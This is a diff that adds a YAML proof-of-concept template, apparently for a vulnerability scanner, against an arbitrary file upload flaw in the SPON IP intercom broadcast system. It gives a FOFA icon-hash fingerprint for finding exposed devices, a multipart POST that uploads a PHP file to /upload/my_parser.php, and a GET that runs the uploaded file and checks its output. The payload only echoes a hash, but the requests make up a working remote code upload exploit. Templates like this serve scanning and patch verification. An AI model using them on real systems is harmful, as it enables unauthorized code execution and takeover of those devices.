@@ -1,0 +1,31 @@
+id: poc-yaml-spon-my-parser-php-anyfile-upload
+info:
+  name: 世邦通信SPON IP网络对讲广播系统 my_parser.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: IP网络对讲广播系统
+  fofa: icon_hash="-1830859634"
+variables:
+  t1: random_str(4)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /upload/my_parser.php
+  headers:
+    Content-Type: multipart/form-data; boundary=0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230
+  data: '--0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230
+
+    Content-Disposition: form-data; name="upload"; filename="{{.t1}}.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo md5({{.t1}});?>
+
+    --0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230--'
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /upload/files/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
